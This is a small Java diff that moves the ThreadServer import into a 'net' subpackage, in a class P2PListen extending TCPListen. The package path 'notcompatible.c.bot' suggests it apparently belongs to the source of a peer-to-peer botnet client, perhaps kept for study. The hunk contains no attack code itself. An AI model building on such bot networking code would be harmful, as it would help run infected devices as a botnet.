@@ -5,7 +5,7 @@ import java.net.InetSocketAddress;
 import java.nio.channels.SelectionKey;
 import java.nio.channels.SocketChannel;
 
-import diff.notcompatible.c.bot.ThreadServer;
+import diff.notcompatible.c.bot.net.ThreadServer;
 
 public class P2PListen extends TCPListen {
 	
